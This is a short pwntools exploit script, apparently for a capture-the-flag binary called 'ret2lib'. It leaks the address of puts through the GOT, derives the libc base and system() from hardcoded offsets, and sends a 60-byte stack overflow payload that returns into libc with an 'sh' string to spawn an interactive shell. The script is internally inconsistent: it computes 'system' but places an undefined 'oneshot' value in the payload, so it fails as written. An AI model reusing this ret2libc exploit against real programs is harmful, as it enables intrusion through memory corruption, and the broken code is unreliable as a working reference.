from pwn import *

s = process("./ret2lib")
e = ELF("./ret2lib")
#context.log_level = 'debug'

puts_plt=e.plt['puts']
puts_got=e.got['puts']
pr = 0x8048399
libc_offset = 0x5f140

s.recvuntil(':')
s.send(str(puts_got))
s.recvuntil('address : ')
libc=int(s.recv(10),16)
libc_base = libc - libc_offset
log.success(hex(libc_base))
system = libc_base + 0x3a940 #system_offset

s.recvuntil(':')
payload = "A"*60
payload += p32(oneshot)
payload += "AAAA"
payload += p32(0x804929e) #sh
s.send(payload)

s.interactive()

